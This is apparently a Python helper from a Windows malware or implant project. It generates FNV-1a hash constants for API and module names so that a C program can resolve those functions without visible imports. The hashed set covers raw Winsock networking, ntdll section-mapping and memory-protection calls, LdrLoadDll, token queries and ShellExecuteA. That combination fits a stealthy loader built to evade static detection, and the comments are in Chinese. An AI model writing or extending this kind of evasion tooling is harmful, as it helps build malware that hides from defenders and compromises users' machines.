# hash_gen.py
def fnv1a(s):
    h = 0x811c9dc5
    for c in s.encode():
        h ^= c
        h = (h * 0x01000193) & 0xFFFFFFFF
    return h

def fnv1a_i(s):
    h = 0x811c9dc5
    for c in s.lower().encode():
        h ^= c
        h = (h * 0x01000193) & 0xFFFFFFFF
    return h

# 需要解析的 API（顺序无所谓，名字必须和代码里一致）
apis = [
    # kernel32
    "CreateFileA","CloseHandle","VirtualProtect","FreeLibrary",
    "GetProcessHeap","HeapAlloc","HeapFree",
    "IsBadReadPtr","Sleep","GetCurrentProcess","GetModuleFileNameA",
    "GetEnvironmentVariableA","GetTickCount",
    # advapi32
    "OpenProcessToken","GetTokenInformation",
    # shell32
    "ShellExecuteA",
    # ws2_32 (raw socket, replaces WinINet)
    "WSAStartup","socket","connect","send","recv","closesocket",
    "gethostbyname","WSAGetLastError","WSACleanup",
    # ntdll
    "NtCreateSection","NtMapViewOfSection","NtUnmapViewOfSection","NtClose",
    "NtAllocateVirtualMemory","NtProtectVirtualMemory","NtFreeVirtualMemory",
    "LdrLoadDll",
]

mods = ["kernel32.dll","ws2_32.dll","user32.dll","shell32.dll","advapi32.dll","ntdll.dll"]

print("// ===== API 哈希（自动生成，勿手改） =====")
for a in apis:
    print(f"#define H_{a:<28} 0x{fnv1a(a):08X}")

print("\n// ===== 模块哈希（大小写不敏感） =====")
for m in mods:
    print(f"#define HM_{m.replace('.','_')} 0x{fnv1a_i(m):08X}")
